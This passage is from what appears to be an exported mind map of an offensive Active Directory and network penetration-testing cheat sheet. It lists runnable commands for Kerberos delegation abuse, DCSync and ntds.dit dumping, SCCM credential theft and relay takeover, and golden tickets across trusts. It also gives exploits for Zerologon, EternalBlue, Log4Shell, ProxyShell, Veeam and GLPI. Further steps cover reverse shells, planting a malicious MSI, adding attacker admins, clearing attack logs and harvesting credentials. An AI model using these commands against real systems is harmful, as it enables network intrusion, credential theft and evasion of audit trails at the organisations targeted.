TGS","children":[],"payload":{"tag":"li","lines":"2212,2214"}}],"payload":{"tag":"li","lines":"2211,2214"}}],"payload":{"tag":"li","lines":"2203,2214"}},{"content":"\n<p data-lines=\"2214,2215\">Without protocol transition (kerberos only) UAC: TRUSTED_FOR_DELEGATION</p>","children":[{"content":"Constrain between Y and Z","children":[{"content":"Add computer X","children":[{"content":"Add RBCD : delegate from X to Y","children":[{"content":"s4u2self X (impersonate admin)","children":[{"content":"S4u2Proxy X (impersonate admin on spn/Y)","children":[{"content":"Forwardable TGS for Y","children":[{"content":"S4u2Proxy Y (impersonate admin on spn/Z)","children":[],"payload":{"tag":"li","lines":"2221,2222"}}],"payload":{"tag":"li","lines":"2220,2222"}}],"payload":{"tag":"li","lines":"2219,2222"}}],"payload":{"tag":"li","lines":"2218,2222"}}],"payload":{"tag":"li","lines":"2217,2222"}}],"payload":{"tag":"li","lines":"2216,2222"}}],"payload":{"tag":"li","lines":"2215,2222"}},{"content":"add computer account","children":[{"content":"<code>addcomputer.py -computer-name &apos;&lt;computer_name&gt;&apos; -computer-pass &apos;&lt;ComputerPassword&gt;&apos; -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; &apos;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"2223,2224"}}],"payload":{"tag":"li","lines":"2222,2224"}},{"content":"RBCD With added computer account &gt;&gt;&gt; Kerberos TGS","children":[{"content":"<code>rbcd.py -delegate-from &apos;&lt;rbcd_con&gt;&#x24;&apos; -delegate-to &apos;&lt;constrained&gt;&#x24;&apos; -dc-ip &apos;&lt;dc&gt;&apos; -action &apos;write&apos; -hashes &apos;&lt;hash&gt;&apos; &lt;domain&gt;/&lt;constrained&gt;&#x24;</code>","children":[{"content":"<code>getST.py -spn host/&lt;constrained&gt; -impersonate Administrator --dc-ip &lt;dc_ip&gt; &apos;&lt;domain&gt;/&lt;rbcd_con&gt;&#x24;:&lt;rbcd_conpass&gt;&apos;</code>","children":[{"content":"<code>getST.py -spn &lt;constrained_spn&gt;/&lt;target&gt; -hashes &apos;&lt;hash&gt;&apos; &apos;&lt;domain&gt;/&lt;constrained&gt;&#x24;&apos; -impersonate Administrator --dc-ip &lt;dc_ip&gt; -additional-ticket &lt;previous_ticket&gt;</code>","children":[],"payload":{"tag":"li","lines":"2227,2228"}}],"payload":{"tag":"li","lines":"2226,2228"}}],"payload":{"tag":"li","lines":"2225,2228"}}],"payload":{"tag":"li","lines":"2224,2228"}},{"content":"Self RBCD @CVE@","children":[{"content":"Like RBCD without add computer","children":[],"payload":{"tag":"li","lines":"2229,2231"}}],"payload":{"tag":"li","lines":"2228,2231"}}],"payload":{"tag":"li","lines":"2214,2231"}}],"payload":{"tag":"h3","lines":"2202,2203"}},{"content":"Resource-Based Constrained Delegation","children":[{"content":"add computer account","children":[{"content":"<code>addcomputer.py -computer-name &apos;&lt;computer_name&gt;&apos; -computer-pass &apos;&lt;ComputerPassword&gt;&apos; -dc-host &lt;dc&gt; -domain-netbios &lt;domain_netbios&gt; &apos;&lt;domain&gt;/&lt;user&gt;:&lt;password&gt;&apos;</code>","children":[],"payload":{"tag":"li","lines":"2233,2234"}}],"payload":{"tag":"li","lines":"2232,2234"}},{"content":"RBCD With added computer account","children":[{"content":"<code>Rubeus.exe hash /password:&lt;computer_pass&gt; /user:&lt;computer&gt; /domain:&lt;domain&gt;</code>","children":[{"content":"<code>Rubeus.exe s4u /user:&lt;fake_computer&#x24;&gt; /aes256:&lt;AES 256 hash&gt; /impersonateuser:administrator /msdsspn:cifs/&lt;victim.domain.local&gt; /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt</code> &gt;&gt;&gt; Admin","children":[],"payload":{"tag":"li","lines":"2236,2237"}}],"payload":{"tag":"li","lines":"2235,2237"}},{"content":"<code>rbcd.py -delegate-from &apos;&lt;computer&gt;&#x24;&apos; -delegate-to &apos;&lt;target&gt;&#x24;&apos; -dc-ip &apos;&lt;dc&gt;&apos; -action &apos;write&apos; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</code>","children":[{"content":"<code>getST.py -spn host/&lt;dc_fqdn&gt; &apos;&lt;domain&gt;/&lt;computer_account&gt;:&lt;computer_pass&gt;&apos; -impersonate Administrator --dc-ip &lt;dc_ip&gt;</code> &gt;&gt;&gt; Kerberos TGT &gt;&gt;&gt; Admin","children":[],"payload":{"tag":"li","lines":"2238,2240"}}],"payload":{"tag":"li","lines":"2237,2240"}}],"payload":{"tag":"li","lines":"2234,2240"}}],"payload":{"tag":"h3","lines":"2231,2232"}},{"content":"S4U2self abuse","children":[{"content":"Get machine account (X)&apos;s TGT","children":[{"content":"Get a ST on X as user admin","children":[],"payload":{"tag":"li","lines":"2242,2243"}}],"payload":{"tag":"li","lines":"2241,2243"}},{"content":"<code>getTGT.py -dc-ip &quot;&lt;dc_ip&gt;&quot; -hashes :&quot;&lt;machine_hash&gt;&quot; &quot;&lt;domain&gt;&quot;/&quot;&lt;machine&gt;&#x24;&quot;</code>","children":[{"content":"<code>getST.py -self -impersonate &quot;&lt;admin&gt;&quot; -altservice &quot;cifs/&lt;machine&gt;&quot; -k -no-pass -dc-ip &quot;DomainController&quot; &quot;&lt;domain&gt;&quot;/&apos;&lt;machine&gt;&#x24;&apos;</code> &gt;&gt;&gt; Admin","children":[],"payload":{"tag":"li","lines":"2244,2246"}}],"payload":{"tag":"li","lines":"2243,2246"}}],"payload":{"tag":"h3","lines":"2240,2241"}}],"payload":{"tag":"h2","lines":"2181,2182"}},{"content":"Domain admin","children":[{"content":"Dump ntds.dit &gt;&gt;&gt; Lateral move || Crack hash","children":[{"content":"<code>nxc smb &lt;dcip&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</code>","children":[],"payload":{"tag":"li","lines":"2249,2250"}},{"content":"<code>secretsdump.py &apos;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&apos;@&lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2250,2251"}},{"content":"<code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\\temp&quot; q q</code>","children":[{"content":"<code>secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</code>","children":[],"payload":{"tag":"li","lines":"2252,2253"}}],"payload":{"tag":"li","lines":"2251,2253"}},{"content":"<code>msf&gt; windows/gather/credentials/domain_hashdump</code>","children":[],"payload":{"tag":"li","lines":"2253,2254"}},{"content":"<code>mimikatz lsadump::dcsync /domain:&lt;target_domain&gt; /user:&lt;target_domain&gt;\\administrator</code>","children":[],"payload":{"tag":"li","lines":"2254,2255"}},{"content":"<code>certsync -u &lt;user&gt; -p &apos;&lt;password&gt;&apos; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -ns &lt;name_server&gt;</code>","children":[],"payload":{"tag":"li","lines":"2255,2257"}}],"payload":{"tag":"h3","lines":"2248,2249"}},{"content":"Grab backup Keys &gt;&gt;&gt; Credentials","children":[{"content":"<code>donpapi collect - H &apos;:&lt;hash&gt;&apos; &lt;domain&gt;/&lt;user&gt;@&lt;ip_range&gt; -t ALL --fetch-pvk</code>","children":[],"payload":{"tag":"li","lines":"2258,2259"}}],"payload":{"tag":"h3","lines":"2257,2258"}}],"payload":{"tag":"h2","lines":"2246,2247"}},{"content":"SCCM Attack Paths","children":[{"content":"Creds&#x2011;1&#xa0;&#x2014;&#xa0;Extract Network&#xa0;Access&#xa0;Account (NAA) Credentials","children":[{"content":"\n<p data-lines=\"2262,2263\"><code>reg query &quot;HKLM\\SOFTWARE\\Microsoft\\SMS\\Components\\SMS_SITE_COMPONENT_MANAGER&quot; /v NetworkAccessAccount</code></p>","children":[],"payload":{"tag":"li","lines":"2262,2263"}},{"content":"\n<p data-lines=\"2263,2264\">Pull the Network&#xa0;Access&#xa0;Account username from registry on the Primary&#xa0;Site server.</p>","children":[],"payload":{"tag":"li","lines":"2263,2264"}},{"content":"\n<p data-lines=\"2264,2265\">Command prints <code>NetworkAccessAccount    REG_SZ    DOMAIN\\naa_svc</code>; password not shown.</p>","children":[],"payload":{"tag":"li","lines":"2264,2265"}},{"content":"\n<p data-lines=\"2265,2266\">Combine with DP&#xa0;API secret below to decrypt the stored password.</p>","children":[],"payload":{"tag":"li","lines":"2265,2267"}},{"content":"\n<p data-lines=\"2267,2268\"><code>C:\\Tools\\MECMDecrypt.exe --reg</code></p>","children":[],"payload":{"tag":"li","lines":"2267,2268"}},{"content":"\n<p data-lines=\"2268,2269\">Decrypt the NAA password using extracted machine key and DPAPI.</p>","children":[],"payload":{"tag":"li","lines":"2268,2269"}},{"content":"\n<p data-lines=\"2269,2270\">Output shows <code>Password: P@ssw0rd123!</code>; empty result means wrong key path.</p>","children":[],"payload":{"tag":"li","lines":"2269,2270"}},{"content":"\n<p data-lines=\"2270,2271\">Use NAA creds to read \\SITE\\SMSPKG&#x24; and harvest package source files.</p>","children":[],"payload":{"tag":"li","lines":"2270,2272"}}],"payload":{"tag":"h3","lines":"2261,2262"}},{"content":"Elevate&#x2011;1&#xa0;&#x2014;&#xa0;Relay to Site Systems","children":[{"content":"<code>ntlmrelayx.py -t cifs://&lt;site-server&gt; --socks</code>","children":[],"payload":{"tag":"li","lines":"2273,2274"}},{"content":"Relay inbound NTLM auth (e.g. from WPAD poisoning) to gain admin on a distribution point.","children":[],"payload":{"tag":"li","lines":"2274,2275"}},{"content":"Successful relay prints <code>SMB relay succeeded</code>; failure shows handshake error.","children":[],"payload":{"tag":"li","lines":"2275,2276"}},{"content":"Open SOCKS listener, connect with <code>psexec.py</code> for SYSTEM shell on the site system.","children":[],"payload":{"tag":"li","lines":"2276,2278"}}],"payload":{"tag":"h3","lines":"2272,2273"}},{"content":"Elevate&#x2011;2&#xa0;&#x2014;&#xa0;Force Client Push","children":[{"content":"<code>Invoke-MECMClientPush -SiteCode PRI -Target &lt;hostname&gt; -Account DOMAIN\\user</code>","children":[],"payload":{"tag":"li","lines":"2279,2280"}},{"content":"Trigger Client&#x202f;Push installation using a captured user token.","children":[],"payload":{"tag":"li","lines":"2280,2281"}},{"content":"MECM logs show CCR creation; client installs the agent remotely.","children":[],"payload":{"tag":"li","lines":"2281,2282"}},{"content":"New agent runs as <code>SYSTEM</code>; use it to execute arbitrary commands via <code>CcmExec.exe /logon</code>.","children":[],"payload":{"tag":"li","lines":"2282,2284"}}],"payload":{"tag":"h3","lines":"2278,2279"}},{"content":"Elevate&#x2011;3&#xa0;&#x2014;&#xa0;Automatic Client Push Abuse","children":[{"content":"Place malicious <code>ccmsetup.msi</code> in <code>\\\\SITE\\SMSPKG\\</code> share replacing the original.","children":[],"payload":{"tag":"li","lines":"2285,2286"}},{"content":"Wait for auto&#x2011;client&#x2011;push to distribute MSI to new hosts.","children":[],"payload":{"tag":"li","lines":"2286,2287"}},{"content":"Clients install malicious agent and beacon to attacker handler.","children":[],"payload":{"tag":"li","lines":"2287,2288"}},{"content":"Harvest SYSTEM shells across the network.","children":[],"payload":{"tag":"li","lines":"2288,2290"}}],"payload":{"tag":"h3","lines":"2284,2285"}},{"content":"CRED&#x2011;6&#xa0;&#x2014;&#xa0;Loot Stored Console&#xa0;Credentials","children":[{"content":"<code>reg query HKCU\\Software\\Microsoft\\ConfigMgr10\\AdminUI\\MRU | findstr Password</code>","children":[],"payload":{"tag":"li","lines":"2291,2292"}},{"content":"Locate encrypted passwords saved by SCCM console.","children":[],"payload":{"tag":"li","lines":"2292,2293"}},{"content":"Output lists Base64 blobs; decrypt with <code>MECMDecrypt.exe --console &lt;blob&gt;</code>.","children":[],"payload":{"tag":"li","lines":"2293,2294"}},{"content":"Resulting user/pass can log into SQL&#x202f;DB or WinRM on server.","children":[],"payload":{"tag":"li","lines":"2294,2296"}}],"payload":{"tag":"h3","lines":"2290,2291"}},{"content":"Takeover&#x2011;1&#xa0;&#x2014;&#xa0;Relay to Site SQL DB","children":[{"content":"<code>ntlmrelayx.py -t mssql://&lt;sql-server&gt;</code>","children":[],"payload":{"tag":"li","lines":"2297,2298"}},{"content":"Relay NTLM auth to MSSQL and enable <code>xp_cmdshell</code>.","children":[],"payload":{"tag":"li","lines":"2298,2299"}},{"content":"Relay output shows <code>Command executed successfully</code>; otherwise login failed.","children":[],"payload":{"tag":"li","lines":"2299,2300"}},{"content":"Run <code>xp_cmdshell &quot;powershell -enc &lt;b64 reverse shell&gt;&quot;</code> to obtain SYSTEM shell.","children":[],"payload":{"tag":"li","lines":"2300,2302"}}],"payload":{"tag":"h3","lines":"2296,2297"}},{"content":"Takeover&#x2011;2&#xa0;&#x2014;&#xa0;Relay to Site Server SMB","children":[{"content":"<code>ntlmrelayx.py -t cifs://&lt;sql-server&gt; -c &quot;net localgroup administrators attacker /add&quot;</code>","children":[],"payload":{"tag":"li","lines":"2303,2304"}},{"content":"Add attacker to local Administrators via SMB relay.","children":[],"payload":{"tag":"li","lines":"2304,2305"}},{"content":"Success prints <code>Added attacker to Administrators</code>.","children":[],"payload":{"tag":"li","lines":"2305,2306"}},{"content":"RDP into SQL server as elevated user and move laterally.","children":[],"payload":{"tag":"li","lines":"2306,2308"}}],"payload":{"tag":"h3","lines":"2302,2303"}},{"content":"Creds&#x2011;2&#xa0;&#x2014;&#xa0;Policy Request Credentials","children":[{"content":"<code>Invoke-NetworkAccessAccount</code> (Toolkit)","children":[],"payload":{"tag":"li","lines":"2309,2310"}},{"content":"Abuse client policy to request download requiring NAA credentials.","children":[],"payload":{"tag":"li","lines":"2310,2311"}},{"content":"The client log <code>LocationServices.log</code> reveals base64&#x2011;encoded creds.","children":[],"payload":{"tag":"li","lines":"2311,2312"}},{"content":"Decode and reuse creds as with Creds&#x2011;1.","children":[],"payload":{"tag":"li","lines":"2312,2314"}}],"payload":{"tag":"h3","lines":"2308,2309"}},{"content":"Creds&#x2011;3 / Creds&#x2011;4&#xa0;&#x2014;&#xa0;Computer Admin to NAA","children":[{"content":"<code>Get-GPPPassword</code> on SYSVOL","children":[],"payload":{"tag":"li","lines":"2315,2316"}},{"content":"Search Group&#xa0;Policy Preferences for <code>cpassword</code> fields.","children":[],"payload":{"tag":"li","lines":"2316,2317"}},{"content":"Script outputs plaintext passwords including NAA if configured.","children":[],"payload":{"tag":"li","lines":"2317,2318"}},{"content":"Log in with recovered credentials or spray across hosts.","children":[],"payload":{"tag":"li","lines":"2318,2320"}}],"payload":{"tag":"h3","lines":"2314,2315"}},{"content":"Creds&#x2011;5&#xa0;&#x2014;&#xa0;Dump Site DB Credentials","children":[{"content":"<code>findstr /s /i /p &quot;password&quot; D:\\Program Files\\Microsoft Configuration Manager\\inboxes\\*.xml</code>","children":[],"payload":{"tag":"li","lines":"2321,2322"}},{"content":"Search SCCM XML config files for embedded SQL connection strings.","children":[],"payload":{"tag":"li","lines":"2322,2323"}},{"content":"Matches show <code>Password=SuperS3cret</code>; empty means creds stored in registry.","children":[],"payload":{"tag":"li","lines":"2323,2324"}},{"content":"Use creds in <code>sqlcmd -S &lt;db&gt; -U sccm_admin -P &lt;pass&gt;</code> to run queries.","children":[],"payload":{"tag":"li","lines":"2324,2326"}}],"payload":{"tag":"h3","lines":"2320,2321"}},{"content":"EXEC&#x2011;1/2&#xa0;&#x2014;&#xa0;Client Notification Abuse","children":[{"content":"<code>Send-CMClientNotification -DeviceName &lt;host&gt; -NotificationType TriggerSchedule {00000000-0000-0000-0000-000000000121}</code>","children":[],"payload":{"tag":"li","lines":"2327,2328"}},{"content":"Push malicious package or script to a managed client.","children":[],"payload":{"tag":"li","lines":"2328,2329"}},{"content":"Notification status <code>Success</code>; client executes as SYSTEM.","children":[],"payload":{"tag":"li","lines":"2329,2330"}},{"content":"Confirm reverse shell on listener and pivot.","children":[],"payload":{"tag":"li","lines":"2330,2332"}}],"payload":{"tag":"h3","lines":"2326,2327"}},{"content":"Cleanup","children":[{"content":"Remove added admin users: <code>net localgroup administrators attacker /del</code>.","children":[],"payload":{"tag":"li","lines":"2333,2334"}},{"content":"Restore original <code>ccmsetup.msi</code> in package share.","children":[],"payload":{"tag":"li","lines":"2334,2335"}},{"content":"Clear attack logs in <code>ccm*.log</code> and SQL audit tables.","children":[],"payload":{"tag":"li","lines":"2335,2337"}}],"payload":{"tag":"h3","lines":"2332,2333"}},{"content":"Post&#x2011;Exploit","children":[{"content":"Use harvested creds to disable SCCM Endpoint&#xa0;Protection policies.","children":[],"payload":{"tag":"li","lines":"2338,2339"}},{"content":"Deploy persistence payload via SCCM task sequence.","children":[],"payload":{"tag":"li","lines":"2339,2340"}},{"content":"Export inventory data for host/network mapping.","children":[],"payload":{"tag":"li","lines":"2340,2342"}}],"payload":{"tag":"h3","lines":"2337,2338"}}],"payload":{"tag":"h2","lines":"2259,2260"}},{"content":"Trusts","children":[{"content":"Enumeration","children":[{"content":"<code>nltest /domain_trusts /all_trusts</code>","children":[],"payload":{"tag":"li","lines":"2347,2348"}},{"content":"Enumerate all domain and forest trusts.","children":[],"payload":{"tag":"li","lines":"2348,2349"}},{"content":"Output lists trust direction flags; blank means no trusts.","children":[],"payload":{"tag":"li","lines":"2349,2350"}},{"content":"Note child, parent, and external trusts for lateral Kerberos attacks.","children":[],"payload":{"tag":"li","lines":"2350,2352"}}],"payload":{"tag":"h3","lines":"2346,2347"}},{"content":"Child&#xa0;&#x2192;&#xa0;Parent Attack","children":[{"content":"<code>mimikatz &quot;kerberos::golden /user:krbtgt /domain:child.local /sid:&lt;childSID&gt; /krbtgt:&lt;hash&gt; /sids:&lt;parentSID&gt;-519 /ptt&quot;</code>","children":[],"payload":{"tag":"li","lines":"2353,2354"}},{"content":"Forge a golden ticket in child domain with parent SID for Enterprise&#xa0;Admins group.","children":[],"payload":{"tag":"li","lines":"2354,2355"}},{"content":"Mimikatz returns &#x201c;ticket inserted&#x201d;; failures show checksum error.","children":[],"payload":{"tag":"li","lines":"2355,2356"}},{"content":"Use ticket to access resources in the parent domain (e.g.&#xa0;<code>cifs/parent-dc</code>).","children":[],"payload":{"tag":"li","lines":"2356,2358"}}],"payload":{"tag":"h3","lines":"2352,2353"}},{"content":"Parent&#xa0;&#x2192;&#xa0;Child Attack","children":[{"content":"<code>mimikatz &quot;kerberos::ptt ticket.kirbi&quot;</code>","children":[],"payload":{"tag":"li","lines":"2359,2360"}},{"content":"Pass existing parent&#x2011;domain TGT into child domain session.","children":[],"payload":{"tag":"li","lines":"2360,2361"}},{"content":"<code>whoami /groups</code> shows child&#x2011;domain privileges if trust is transitive.","children":[],"payload":{"tag":"li","lines":"2361,2362"}},{"content":"Enumerate child DC with <code>secretsdump</code> to grab hashes.","children":[],"payload":{"tag":"li","lines":"2362,2364"}}],"payload":{"tag":"h3","lines":"2358,2359"}},{"content":"External Trust Abuse","children":[{"content":"<code>Get-TGSCipher -Target external.local</code>","children":[],"payload":{"tag":"li","lines":"2365,2366"}},{"content":"Request TGS using external trust path.","children":[],"payload":{"tag":"li","lines":"2366,2367"}},{"content":"Output provides <code>&#x24;krb5tgs&#x24;23&#x24;</code> hash.","children":[],"payload":{"tag":"li","lines":"2367,2368"}},{"content":"Crack hash to impersonate external service account.","children":[],"payload":{"tag":"li","lines":"2368,2370"}}],"payload":{"tag":"h3","lines":"2364,2365"}},{"content":"MSSQL Links Abuse","children":[{"content":"<code>EXEC (&apos;sp_linkedservers&apos;) AT &lt;remote&gt;</code>","children":[],"payload":{"tag":"li","lines":"2371,2372"}},{"content":"List linked SQL servers across trusts.","children":[],"payload":{"tag":"li","lines":"2372,2373"}},{"content":"Results show server names; empty means none configured.","children":[],"payload":{"tag":"li","lines":"2373,2374"}},{"content":"If link has RPC&#xa0;OUT, run <code>xp_cmdshell</code> for code execution on linked host.","children":[],"payload":{"tag":"li","lines":"2374,2376"}}],"payload":{"tag":"h3","lines":"2370,2371"}}],"payload":{"tag":"h2","lines":"2344,2345"}},{"content":"Valid User (no password)","children":[{"content":"<code>GetNPUsers.py validuser -dc-ip &lt;ip&gt; -no-pass</code>","children":[],"payload":{"tag":"li","lines":"2379,2380"}},{"content":"AS&#x2011;REP roast a user that does not require pre&#x2011;auth.","children":[],"payload":{"tag":"li","lines":"2380,2381"}},{"content":"Script outputs <code>&#x24;krb5asrep&#x24;23&#x24;</code> hash.","children":[],"payload":{"tag":"li","lines":"2381,2382"}},{"content":"Crack with hashcat (<code>-m 18200</code>), then use password to log in via RDP/SMB.","children":[],"payload":{"tag":"li","lines":"2382,2386"}}],"payload":{"tag":"h2","lines":"2378,2379"}}],"payload":{"tag":"h1","lines":"1189,1190"}},{"content":"Quick Compromise","children":[{"content":"&#x26a0;&#xfe0f; Zerologon&#xa0;(CVE&#x2011;2020&#x2011;1472) &#x2192; Domain&#xa0;Admin","children":[{"content":"<code>zerologon-scan &lt;dc_netbios&gt; &lt;ip&gt;</code>","children":[],"payload":{"tag":"li","lines":"2389,2390"}},{"content":"Scan the DC for Zerologon vulnerability (Zero&#x2011;logon authentication bypass).","children":[],"payload":{"tag":"li","lines":"2390,2391"}},{"content":"Output shows &#x201c;VULNERABLE&#x201d; when the DC accepts zero&#x2011;length NTLM packets; &#x201c;not vulnerable&#x201d; otherwise.","children":[],"payload":{"tag":"li","lines":"2391,2392"}},{"content":"If vulnerable, run <code>cve-2020-1472-exploit.py &lt;dc_netbios&gt; &lt;ip&gt;</code> to reset the machine&#x2011;account password, then use secretsdump to grab domain hashes and promote to Domain&#xa0;Admin.","children":[],"payload":{"tag":"li","lines":"2392,2394"}}],"payload":{"tag":"h2","lines":"2388,2389"}},{"content":"EternalBlue&#xa0;(MS17&#x2011;010) &#x2192; SYSTEM / Domain foothold","children":[{"content":"<code>msfconsole -q -x &quot;use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS &lt;ip&gt;; run&quot;</code>","children":[],"payload":{"tag":"li","lines":"2395,2396"}},{"content":"Exploit SMBv1 buffer overflow to gain kernel&#x2011;level shell.","children":[],"payload":{"tag":"li","lines":"2396,2397"}},{"content":"Meterpreter session opens on success; exploit aborts if SMBv1 disabled.","children":[],"payload":{"tag":"li","lines":"2397,2398"}},{"content":"Migrate to a stable process, dump hashes, and move laterally with psexec.","children":[],"payload":{"tag":"li","lines":"2398,2400"}}],"payload":{"tag":"h2","lines":"2394,2395"}},{"content":"Tomcat / JBoss Manager Upload &#x2192; Web&#xa0;Shell &#x2192; SYSTEM","children":[{"content":"<code>msfconsole -q -x &quot;use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS &lt;ip&gt;; set USERNAME tomcat; set PASSWORD s3cret; run&quot;</code>","children":[],"payload":{"tag":"li","lines":"2401,2402"}},{"content":"Upload a WAR file via manager interface and execute a reverse shell.","children":[],"payload":{"tag":"li","lines":"2402,2403"}},{"content":"Success prints shell URL; invalid creds return 401&#xa0;Unauthorized.","children":[],"payload":{"tag":"li","lines":"2403,2404"}},{"content":"Interact with shell, enumerate service accounts, and pivot to OS&#x2011;level privilege escalation.","children":[],"payload":{"tag":"li","lines":"2404,2406"}}],"payload":{"tag":"h2","lines":"2400,2401"}},{"content":"Java&#xa0;RMI Deserialization","children":[{"content":"<code>msfconsole -q -x &quot;use exploit/multi/misc/java_rmi_server; set RHOSTS &lt;ip&gt;; run&quot;</code>","children":[],"payload":{"tag":"li","lines":"2407,2408"}},{"content":"Abuse RMI registry deserialization to run arbitrary code.","children":[],"payload":{"tag":"li","lines":"2408,2409"}},{"content":"Meterpreter shell received on success; timeout indicates patched server.","children":[],"payload":{"tag":"li","lines":"2409,2410"}},{"content":"Drop persistence JAR or pivot deeper into the Java application stack.","children":[],"payload":{"tag":"li","lines":"2410,2412"}}],"payload":{"tag":"h2","lines":"2406,2407"}},{"content":"Java Serialized Object Port","children":[{"content":"<code>ysoserial.jar &lt;gadget&gt; &apos;calc&apos; | nc &lt;ip&gt; &lt;port&gt;</code>","children":[],"payload":{"tag":"li","lines":"2413,2414"}},{"content":"Send gadget chain to vulnerable deserialization endpoint.","children":[],"payload":{"tag":"li","lines":"2414,2415"}},{"content":"Target executes supplied command; no response = blocked gadget.","children":[],"payload":{"tag":"li","lines":"2415,2416"}},{"content":"Swap gadget types (CommonsCollections, Groovy) or wrap in HTTP POST.","children":[],"payload":{"tag":"li","lines":"2416,2418"}}],"payload":{"tag":"h2","lines":"2412,2413"}},{"content":"Log4Shell&#xa0;(CVE&#x2011;2021&#x2011;44228)","children":[{"content":"<code>&#x24;{jndi:ldap://&lt;ip&gt;:1389/exp}</code> (in any loggable header)","children":[],"payload":{"tag":"li","lines":"2419,2420"}},{"content":"Trigger JNDI lookup to pull malicious class and execute code.","children":[],"payload":{"tag":"li","lines":"2420,2421"}},{"content":"Out&#x2011;of&#x2011;band LDAP server shows callback; reverse shell connects back.","children":[],"payload":{"tag":"li","lines":"2421,2422"}},{"content":"Patch by setting <code>log4j2.formatMsgNoLookups=true</code>; otherwise use shell to escalate.","children":[],"payload":{"tag":"li","lines":"2422,2424"}}],"payload":{"tag":"h2","lines":"2418,2419"}},{"content":"MSSQL Quick Enum","children":[{"content":"<code>mssqlclient.py &lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip&gt; -windows-auth</code>","children":[],"payload":{"tag":"li","lines":"2425,2426"}},{"content":"Connect to MSSQL with valid creds and check sysadmin status.","children":[],"payload":{"tag":"li","lines":"2426,2427"}},{"content":"Prompt shows <code>SQL&gt;</code> on success; login failed otherwise.","children":[],"payload":{"tag":"li","lines":"2427,2428"}},{"content":"If <code>is_srvrolemember(&apos;sysadmin&apos;)=1</code> &#x2192; enable <code>xp_cmdshell</code> for OS command exec.","children":[],"payload":{"tag":"li","lines":"2428,2430"}}],"payload":{"tag":"h2","lines":"2424,2425"}},{"content":"Exchange&#xa0;ProxyShell&#xa0;(CVE&#x2011;2021&#x2011;34473)","children":[{"content":"<code>proxyshell_rce.py -u https://&lt;exchange&gt; -e administrator@&lt;domain&gt;</code>","children":[],"payload":{"tag":"li","lines":"2431,2432"}},{"content":"Exploit auto&#x2011;discover endpoint chain to drop web shell.","children":[],"payload":{"tag":"li","lines":"2432,2433"}},{"content":"Script prints shell path on success; 401 errors mean patched server.","children":[],"payload":{"tag":"li","lines":"2433,2434"}},{"content":"Use web shell to add new mailbox rule &#x2192; persistence + lateral movement.","children":[],"payload":{"tag":"li","lines":"2434,2436"}}],"payload":{"tag":"h2","lines":"2430,2431"}},{"content":"Veeam Backup","children":[{"content":"<code>VeeamHax.exe --target &lt;veeam_server&gt;</code>","children":[],"payload":{"tag":"li","lines":"2437,2438"}},{"content":"Dump stored backup credentials via CVE&#x2011;2023&#x2011;27532.","children":[],"payload":{"tag":"li","lines":"2438,2439"}},{"content":"Tool prints usernames/passwords; &#x201c;not vulnerable&#x201d; if patched.","children":[],"payload":{"tag":"li","lines":"2439,2440"}},{"content":"Reuse service creds to pivot to vSphere or Windows hosts.","children":[],"payload":{"tag":"li","lines":"2440,2442"}}],"payload":{"tag":"h2","lines":"2436,2437"}},{"content":"GLPI Web&#xa0;UI","children":[{"content":"<code>curl http://&lt;ip&gt;/vendor/htmlawed/htmlawed/htmLawedTest.php</code>","children":[],"payload":{"tag":"li","lines":"2443,2444"}},{"content":"Trigger CVE&#x2011;2022&#x2011;35914 RCE endpoint.","children":[],"payload":{"tag":"li","lines":"2444,2445"}},{"content":"Response includes command output; 404 means missing file.","children":[],"payload":{"tag":"li","lines":"2445,2446"}},{"content":"Drop reverse shell PHP and connect back to listener.","children":[],"payload":{"tag":"li","lines":"2446,2448"}}],"payload":{"tag":"h2","lines":"2442,2443"}},{"content":"Weak&#x2011;Service Sweep","children":[{"content":"<code>nuclei -target &lt;ip_range&gt;</code>","children":[],"payload":{"tag":"li","lines":"2449,2450"}},{"content":"Scan large ranges for known CVEs and misconfigurations.","children":[],"payload":{"tag":"li","lines":"2450,2451"}},{"content":"Nuclei report lists matched templates; empty report suggests hardened range.","children":[],"payload":{"tag":"li","lines":"2451,2452"}},{"content":"Prioritize high&#x2011;severity hits for immediate exploitation.","children":[],"payload":{"tag":"li","lines":"2452,2454"}}],"payload":{"tag":"h2","lines":"2448,2449"}}],"payload":{"tag":"h1","lines":"2386,2387"}},{"content":"Post&#x2011;Exploitation","children":[{"content":"Credential Harvesting","children":[{"content":"Linux","children":[{"content":"\n<p data-lines=\"2461,2462\"><code>cat /etc/passwd</code></p>","children":[],"payload":{"tag":"li","lines":"2461,2462"}},{"content":"\n<p data-lines=\"2462,2463\">List local users for potential enumeration.</p>","children":[],"payload":{"tag":"li","lines":"2462,2463"}},{"content":"\n<p data-lines=\"2463,2464\">File displays username list; permission denied means restricted.</p>","children":[],"payload":{"tag":"li","lines":"2463,2464"}},{"content":"\n<p data-lines=\"2464,2465\">Pair with <code>/etc/shadow</code> (root only) to crack offline passwords.</p>","children":[],"payload":{"tag":"li","lines":"2464,2466"}},{"content":"\n<p data-lines=\"2466,2467\"><code>grep -R &quot;password&quot; /var/www/html</code></p>","children":[],"payload":{"tag":"li","lines":"2466,2467"}},{"content":"\n<p data-lines=\"2467,2468\">Search web application files for hard&#x2011;coded passwords.</p>","children":[],"payload":{"tag":"li","lines":"2467,2468"}},{"content":"\n<p data-lines=\"2468,2469\">Hits highlight credentials in config files; no hits = none found.</p>","children":[],"payload":{"tag":"li","lines":"2468,2469"}},{"content":"\n<p data-lines=\"2469,2470\">Use creds to log into DBs or external services.</p>","children":[],"payload":{"tag":"li","lines":"2469,2471"}}],"payload":{"tag":"h3","lines":"2460,2461"}},{"content":"Windows","children":[{"content":"\n<p data-lines=\"2472,2473\"><code>Invoke-Mimikatz -Command 